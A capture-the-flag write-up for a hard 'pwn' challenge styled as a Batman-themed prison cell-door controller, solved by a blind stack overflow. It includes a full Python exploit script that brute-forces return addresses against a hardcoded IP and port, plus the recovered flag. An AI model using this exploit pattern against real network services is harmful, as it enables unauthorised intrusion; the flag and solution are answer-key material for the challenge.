---
title: "Arkham Lockdown"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: pwn
difficulty: hard
points: 300
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Arkham Lockdown

## summary

blind remote pwn, no binary given. just a cell-door controller with a file-transfer option that has a stack overflow, no canary. the ret address sits ~72 bytes in. brute the saved return over 0x4012xx and one of them lands on the MASTER OVERRIDE win function that prints the flag.

## how i solved it

### 1. poke the service

```bash
nc 172.198.160.128 1339
```

```text
========================================================
      ARKHAM ASYLUM  ::  CELL DOOR CONTROLLER v2.3
           GOTHAM CITY CORRECTIONS DEPARTMENT
========================================================

[1] List inmates
[2] File transfer request
[3] Log out
guard@arkham> 
```

### 2. find the overflow

```text
opt 1 just lists inmates (Jack Napier, Harvey Dent, etc). opt 2 'File transfer request' reads a filename into a stack buffer with no bounds check + no canary. send a long string and it smashes the saved ret.
```

```text
AAAA...{\x11@   <- our bytes end up in RIP, offset is 72
```

### 3. brute the return addr

```python
# no binary, so blind ret2win. code is at 0x401xxx (PIE off). sweep 0x4012xx
for ret in range(0x401200, 0x4012ff):
    out = overflow(pad=72, ret=ret)
    if b'OVERRIDE' in out: print(hex(ret), out)
```

```text
[HIT] 0x401286 -> ...MASTER OVERRIDE ACCEPTED... pbctf{BA...
[HIT] 0x401287 -> ...MASTER OVERRIDE ACCEPTED...
[HIT] 0x401290 -> ...
```

### 4. fire the winning addr

```python
payload = b'A'*72 + struct.pack('<Q', 0x401286)
s.sendall(payload + b'\n')
print(recv_all())
```

```text
[!] MASTER OVERRIDE ACCEPTED.
[!] All cell doors in Block D are now OPEN.
[!] ...the Batman is gone. He was never really here.

pbctf{BATMAN_IS_NOT_GAY}
```

## full solve script

```python
#!/usr/bin/env python3
import socket, struct

HOST, PORT = '172.198.160.128', 1339

def ru(s, m, t=3):
    s.settimeout(t); d = b''
    try:
        while m not in d:
            x = s.recv(4096)
            if not x: break
            d += x
    except socket.timeout:
        pass
    return d

def overflow(ret, pad=72):
    s = socket.socket(); s.settimeout(4); s.connect((HOST, PORT))
    ru(s, b'guard@arkham> ')
    s.sendall(b'2\n'); ru(s, b'transfer: ')
    s.sendall(b'A'*pad + struct.pack('<Q', ret) + b'\n')
    out = ru(s, b'guard@arkham> ', 3)
    s.close(); return out

# blind ret2win: sweep the win fn in the 0x4012xx range
for ret in range(0x401200, 0x4012ff):
    out = overflow(ret)
    if b'OVERRIDE' in out:
        print('[HIT]', hex(ret))
        for line in out.split(b'\n'):
            if b'pbctf{' in line:
                print(line.strip().decode())
        break
```

```text
[HIT] 0x401286
[!] MASTER OVERRIDE ACCEPTED.
[!] All cell doors in Block D are now OPEN.
[!] ...the Batman is gone. He was never really here.
pbctf{BATMAN_IS_NOT_GAY}
```

## flag

```
pbctf{BATMAN_IS_NOT_GAY}
```
